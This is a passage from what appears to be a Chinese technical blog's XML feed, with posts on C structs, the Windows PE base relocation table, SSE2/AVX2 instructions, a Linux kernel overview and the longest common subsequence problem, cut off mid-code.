class="comment">// 库存</span></span><br><span class="line">    <span class="type">float</span> price; <span class="comment">// 价格</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们也许可以再进一步,实现这家书店的信息:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 书店的各种信息</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_BOOKS 1000 <span class="comment">// 最多1000种书目</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BookStore</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">100</span>]; <span class="comment">// 书店名</span></span><br><span class="line">    <span class="type">char</span> address[<span class="number">100</span>]; <span class="comment">// 地址</span></span><br><span class="line">    <span class="type">int</span> phone; <span class="comment">// 电话</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Book</span> <span class="title">books</span>[<span class="title">MAX_BOOKS</span>];</span> <span class="comment">// Book结构体类型的数组作为BookStore结构体的成员</span></span><br><span class="line">    <span class="type">int</span> bookCount; <span class="comment">// 书籍数量</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>现在数据类型定义好了,接下来可以使用他们来解决问题了,不过这个步骤还是留待后面再说吧,因为还没有讲<code>结构体与指针</code>.</p><br><p>本节讲解了结构体的基本内容,接下来会讲解结构体与指针的关系,该部分尽管不是很难,但对后续实现各种数据结构十分重要.</p><p align=right>——WAHAHA 2024.2.9</p><p align=right>除夕快乐~~~</p><br><p>上一篇:<a href="../2024a81853a8d10a">C语言教程-13_4-函数指针</a></p><p>下一篇:<a href="../2024aaafa05fda1d">C语言教程-14_2-结构体与指针</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基址重定位表</title>
      <link href="/2024f36a65aeede5/"/>
      <url>/2024f36a65aeede5/</url>
      
        <content type="html"><![CDATA[<h1 id="pe重定位">PE重定位</h1><p>PE文件向进程中载入时,会被加载到PE头的ImageBase所指的地址处,如果加载的是DLL/SYS文件,该地址已经被其他DLL占用,那么就需要进行PE文件重定位.</p><p>PE文件在重定位时会使用<code>基址重定位表</code>,将硬编码在PE程序中的内存地址进行重新计算,让内存地址随加载地址变化而变化.</p><h2 id="dll-sys重定位">DLL/SYS重定位</h2><p>假设TEST.EXE在载入时,A.DLL被载入到TEST.EXE的10000000地址处,此时B.DLL试图加载到相同地址,PE装载器就会将其装载到另一个未被占用的地址(该地址不能够和TEST.EXE和A.DLL所占的内存重叠).</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240122224357356.png" alt="image-20240122224357356" style="zoom:33%;" /><h2 id="exe重定位">EXE重定位</h2><p>创建好进程后,EXE首先被加载到内存,因此无需考虑重定位问题.</p><p>另外,Windows Vista之后引入了ASLR机制,这会让每次加载都会在不同的随机地址.</p><h1 id="重定位操作">重定位操作</h1><p>原理很简单:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240122224618606.png" alt="image-20240122224618606" style="zoom: 50%;" /><p>查找硬编码时,使用到PE文件中的<code>基址重定位表</code>,它记录了硬编码地址偏移(位置),在PE文件构建(编译/链接)时制定该表.</p><h2 id="基址重定位表">基址重定位表</h2><p>该表位于PE头的DataDirectory数组的第6个元素:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240122225417440.png" alt="image-20240122225417440" style="zoom:50%;" /><p>跳转到该地址可以看到基址重定位表的实际内容:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240122225631757.png" alt="image-20240122225631757" style="zoom:50%;" /><h3 id="image-base-relocation结构体">IMAGE_BASE_RELOCATION结构体</h3><p>重定位表中罗列了程序中所有的硬编码地址的偏移(位置).重定位表是IMAGE_BASE_RELOCATION结构体数组.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240122225829232.png" alt="image-20240122225829232" style="zoom:50%;" /><p>第一个成员VirtualAddress为基准地址,实际上是一个RVA;第二个SizeOfBlock为重定位块的大小;最后一项为注释,并非结构体成员,表示结构体之下会出现WORD类型的数组,其元素值为硬编码的地址偏移.</p><p>根据下表的例子,可以知道TypeOffset数组成员的基准地址(起始地址)RVA为1000,块总大小为150.块末尾以0结束:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240122230438099.png" alt="image-20240122230438099" style="zoom:50%;" /><p>每个元素值为2字节大小,最高4位为Type,低12位是Offset.</p><p>PE中Tpye常见为3(IMAGE_REL_BASED_HIGHLOW),PE+文件常见为A(IMAGE_REL_BASED_ABSOLUTE).</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240122231056230.png" alt="image-20240122231056230" style="zoom:50%;" /><p>接下来就可以定位硬编码了,公式如下:</p><p><code>VirtualAddress(1000)+Offset(420)=1420(RVA)</code></p><p>跳转到该地址就可以找到硬编码地址:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240122231527291.png" alt="image-20240122231527291" style="zoom:50%;" /><p>然后就可以根据实际加载地址去进行重新计算了.其余的硬编码都如此依次处理.</p>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> RE </tag>
            
            <tag> 逆向工程核心原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSE2&amp;AVX2指令集</title>
      <link href="/20249f8cff4da0ec/"/>
      <url>/20249f8cff4da0ec/</url>
      
        <content type="html"><![CDATA[<p><code>vmovdqu ymm1, [memory_operand]</code>:将内存[memory_operand]载入ymm1(允许对齐和非对齐的存储器传送)</p><p><code>vpxor ymm1, ymm2, ymm3</code>:ymm2^ymm3-&gt;ymm1</p>]]></content>
      
      
      <categories>
          
          <category> 汇编 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RE </tag>
            
            <tag> 汇编 </tag>
            
            <tag> SSE2 </tag>
            
            <tag> AVX2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>进程管理</title>
      <link href="/2024da9c28cf6ee0/"/>
      <url>/2024da9c28cf6ee0/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Linux内核 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux内核概述</title>
      <link href="/2024c9dc3e5e81ef/"/>
      <url>/2024c9dc3e5e81ef/</url>
      
        <content type="html"><![CDATA[<h1 id="linux简介">Linux简介</h1><p>1991年,Linus Torvalds为当时新推出的Intel 80386微处理器计算机设计了一款操作系统,Liux由此诞生.当时对Minix感到失望的他从一个简单的终端仿真程序开始,不断改进完善,逐渐演变为早期的Linux.</p><p>Linux是类UNIX,但不是UNIX.它借鉴了UNIX的许多设计,并且实现了UNIX的API,但并没有使用UNIX的源码,必要时,其实现可能和UNIX大相径庭.但它并没有抛弃UNIX的设计目标,并且保证了应用程序接口的一致.</p><p>Linux是一个非商业化的产品,实际上,它是一个互联网上的协作开发项目.任何人都可以开发内核,Linux是自由(公开)软件.当然,并不是无限自由,其使用GPL第2版作为限制条款.也就是说,你可以自由地获取内核代码并修改,但如果你希望发布你修改的内核,其他使用你的内核的人也要享有你曾经享有过的所有权利,当然,包括全部的源代码.</p><p>Linux用途广泛,包含许多的内容,其基础为内核、C库、工具集和系统的基本工具。现在Linux也支持X Windows，例如GNOME。</p><h1 id="linux内核">Linux内核</h1><p>与操作系统的外在表现（例如X Windows）不同，Linux内核是操作系统的核心，通常一个内核由中断服务程序、调度程序、内存管理程序、网络、进程间通信等系统服务程序共同组成。现代系统提供了保护机制，内核拥有受保护的内存空间和访问硬件设备的所有权限，称为内核空间。</p><p>应用程序通过<code>系统调用</code>来与内核通信.例如调用库函数(例如C库函数),由库函数调用系统调用来由内核代为操作.</p><h1 id="单内核与微内核">单内核与微内核</h1><p>操作系统内核分为两大阵营:单内核与微内核(第三阵营是外内核,主要用于科研系统中).</p><p>单内核整体作为一个单独的大进程,通常以单个静态二进制文件的形式存放于磁盘中,所有内核服务都在这样一个大内核地址空间上运行.内核可以直接调用函数,设计者认为这种模式简单且高效.大多数UNIX都设计为单内核.</p><p>微内核被划分为多个独立进程,称为服务器.理想情况下,只有强烈请求特权服务的服务器才运行在特权模式下,其他服务器都运行在用户空间.不过,所有服务器都保持独立并运行于各自的地址空间上,因此不能像单核那样直接调用函数,而是通过<code>消息传递</code>处理内核通信:系统采用进程间通信(IPC)机制.服务器间有效避免了彼此祸及对方.但是IPC机制开销多于函数调用,又涉及内核空间与用户空间的上下文切换,因此实际上大部分服务器或全部服务器都位于内核,这样就可以直接调用函数,以消除频繁的上下文切换,WindowsNT内核就是典型的微内核操作系统.</p><p>Linux是一个单内核,不过它也汲取了微内核的精华:模块化设计、抢占式内核、支持内核线程以及动态装载内核模块.并且Linux让所有事情都运行于内核态,直接调用函数,无需消息传递.至今,Linux是模块化的,多线程的以及内核本身可调度的操作系统.</p><h1 id="linux内核版本">Linux内核版本</h1><p>Linux用3个或4个数字来代表不同的内核版本.第一个数字为主版本号,第二个为从版本号,第三个是修订版本号,第四个是稳定版本号.副版本号为偶数就是则稳定版,奇数则为开发版.</p>]]></content>
      
      
      <categories>
          
          <category> Linux内核 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>子序列问题</title>
      <link href="/202498d97cd29f25/"/>
      <url>/202498d97cd29f25/</url>
      
        <content type="html"><![CDATA[<p>参考:<a href="https://oi-wiki.org/dp/basic/">https://oi-wiki.org/dp/basic/</a></p><h1 id="最长公共子序列-lcs">最长公共子序列(LCS)</h1><p>LCS即求2个序列最长的公共子序列(可以不连续).</p><p>给定2个序列<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mn>1</mn></msub><mtext>和</mtext><msub><mi>S</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">S_1和S_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">和</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>,长度分别为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mtext>和</mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">m和n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mord cjk_fallback">和</span><span class="mord mathdefault">n</span></span></span></span>.记<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">S_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>的前<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>个字符和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">S_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>的前<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span></span></span></span>个字符的最长公共子序列长度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mi>C</mi><mi>S</mi><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">LCS(i,j)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">L</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">)</span></span></span></span>,则最终结果<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">S_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">S_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>的最长公共子序列长度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mi>C</mi><mi>S</mi><mo stretchy="false">(</mo><mi>m</mi><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">LCS(m,n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">L</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span></p><p>状态转移方程为:</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mi>C</mi><mi>S</mi><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>0</mn><mo separator="true">,</mo><mtext> </mtext><mo stretchy="false">(</mo><mi>i</mi><mo>=</mo><mn>0</mn><mtext> </mtext><mi>o</mi><mi>r</mi><mtext> </mtext><mi>j</mi><mo>=</mo><mn>0</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>L</mi><mi>C</mi><mi>S</mi><mo stretchy="false">(</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo separator="true">,</mo><mi>j</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn><mo separator="true">,</mo><mtext> </mtext><mo stretchy="false">(</mo><msub><mi>S</mi><mn>1</mn></msub><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo>=</mo><msub><mi>S</mi><mn>2</mn></msub><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>m</mi><mi>a</mi><mi>x</mi><mo stretchy="false">(</mo><mi>L</mi><mi>C</mi><mi>S</mi><mo stretchy="false">(</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>L</mi><mi>C</mi><mi>S</mi><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo separator="true">,</mo><mtext> </mtext><mo stretchy="false">(</mo><msub><mi>S</mi><mn>1</mn></msub><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo mathvariant="normal">≠</mo><msub><mi>S</mi><mn>2</mn></msub><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">LCS(i,j)=\begin{cases}0,\ (i=0\ or\ j=0)\\LCS(i-1,j-1)+1,\ (S_1[i]=S_2[j])\\max(LCS(i-1,j),LCS(i,j-1)),\ (S_1[i]\ne S_2[j])\end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">L</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:4.32em;vertical-align:-1.9099999999999997em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.35002em;"><span style="top:-2.19999em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎩</span></span></span><span style="top:-2.19499em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-2.20499em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-3.15001em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎨</span></span></span><span style="top:-4.2950099999999996em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-4.30501em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-4.60002em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎧</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.8500199999999998em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.41em;"><span style="top:-4.41em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace"> </span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">0</span><span class="mspace"> </span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace"> </span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">0</span><span class="mclose">)</span></span></span><span style="top:-2.97em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathdefault">L</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace"> </span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mclose">)</span></span></span><span style="top:-1.5300000000000002em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mord mathdefault">x</span><span class="mopen">(</span><span class="mord mathdefault">L</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">L</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace"> </span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel"><span class="mord"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel"></span></span><span class="fix"></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.9099999999999997em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><h2 id="常规方法-二维dp">常规方法(二维DP)</h2><p>使用二维数组<code>f[m+1][n+1]</code>来对<code>LCS()</code>进行迭代即可编写代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span 